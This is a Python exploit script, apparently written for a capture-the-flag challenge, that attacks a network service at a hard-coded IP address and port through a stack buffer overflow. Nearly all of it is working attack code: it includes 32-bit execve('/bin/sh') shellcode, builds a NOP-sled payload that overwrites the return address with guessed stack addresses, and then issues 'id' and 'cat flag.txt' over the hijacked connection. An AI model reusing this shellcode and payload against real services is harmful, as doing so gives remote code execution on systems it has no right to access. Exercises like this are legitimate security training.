#!/usr/bin/env python3
"""
Red Dragon Syndicate - Buffer Overflow Exploit
The binary has an executable stack, so we can use shellcode.
"""

import socket
import struct
import time
import re

# Target information
HOST = "160.187.130.170"
PORT = 10006

# Buffer analysis:
# accept_message function:
# - Stack frame: subl $0x44, %esp (68 bytes allocated)
# - Buffer at -0x48(%ebp) = ebp - 0x48 = 72 bytes from base pointer
# - When function is called: push ebp; mov esp, ebp
# - After subl $0x44: esp = old_esp - 0x44
# - Buffer at ebp - 0x48 = (old_esp) - 0x48
# - Relative to new esp: buffer = esp + 0x44 - 0x48 = esp - 4
# - But we need the actual address, so we'll leak it from show_addresses

OFFSET = 76  # Offset to return address (72 bytes buffer + 4 bytes saved EBP)

# Shellcode: execve("/bin/sh", ["/bin/sh"], NULL)
# 32-bit x86 shellcode
SHELLCODE = (
    b"\x31\xc0"          # xor eax, eax
    b"\x50"              # push eax
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"          # mov ebx, esp
    b"\x50"              # push eax
    b"\x53"              # push ebx
    b"\x89\xe1"          # mov ecx, esp
    b"\x99"              # cdq (sets edx to 0)
    b"\xb0\x0b"          # mov al, 0xb (execve syscall)
    b"\xcd\x80"          # int 0x80
)

def leak_addresses(s):
    """Leak stack addresses using option 1"""
    print("[*] Leaking addresses...")
    s.send(b"1\n")
    time.sleep(0.5)
    data = s.recv(4096).decode('utf-8', errors='ignore')
    print(f"[*] Address leak response:\n{data}")
    
    # Try to extract addresses from the output
    # Look for hex addresses
    addresses = re.findall(r'0x[0-9a-fA-F]+', data)
    print(f"[*] Found addresses: {addresses}")
    return addresses

def create_payload(buffer_addr):
    """Create the exploit payload"""
    NOP = b"\x90"  # NOP instruction
    NOP_SLED_SIZE = 40
    
    # Payload structure:
    # [NOP sled][Shellcode][Padding to offset][Return address pointing to buffer]
    
    payload = b""
    payload += NOP * NOP_SLED_SIZE
    payload += SHELLCODE
    payload += b"A" * (OFFSET - len(payload))
    
    # Convert buffer address to little-endian
    payload += struct.pack("<I", buffer_addr)
    
    return payload

def exploit():
    """Main exploit function"""
    print(f"[*] Connecting to {HOST}:{PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))
        
        # Receive banner
        data = s.recv(4096)
        print(f"[*] Banner:\n{data.decode('utf-8', errors='ignore')}")
        
        # Leak addresses first to see what we get
        addresses = leak_addresses(s)
        
        # The leaked addresses are code addresses, not stack addresses
        # We need to find the stack address. Let's try a different approach:
        # Since the buffer is on the stack and we control it, we can try
        # to use a common stack address range and adjust
        
        # For 32-bit Linux, stack typically starts around 0xffffd000-0xffffe000
        # Let's try multiple addresses in a range
        stack_addresses = [
            0xffffd000,
            0xffffd100,
            0xffffd200,
            0xffffd300,
            0xffffd400,
            0xffffd500,
            0xffffd600,
            0xffffd700,
            0xffffd800,
            0xffffd900,
            0xffffda00,
            0xffffdb00,
            0xffffdc00,
            0xffffdd00,
            0xffffde00,
            0xffffdf00,
        ]
        
        # Try the first address for now
        buffer_addr = stack_addresses[0]
        print(f"[*] Trying buffer address: 0x{buffer_addr:x}")
        
        # Select option 2 (accept_message)
        print("[*] Selecting option 2...")
        s.send(b"2\n")
        time.sleep(0.5)
        
        # Receive prompt
        data = s.recv(4096)
        print(f"[*] Prompt: {data.decode('utf-8', errors='ignore')}")
        
        # Send payload
        payload = create_payload(buffer_addr)
        print(f"[*] Sending payload ({len(payload)} bytes)...")
        s.send(payload)
        
        # Try to interact with shell
        time.sleep(1)
        s.send(b"id\n")
        time.sleep(0.5)
        data = s.recv(4096)
        print(f"[*] Response: {data.decode('utf-8', errors='ignore')}")
        
        # Try to get flag
        s.send(b"cat flag.txt\n")
        time.sleep(0.5)
        data = s.recv(4096)
        print(f"[*] Flag response: {data.decode('utf-8', errors='ignore')}")
        
        s.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    exploit()

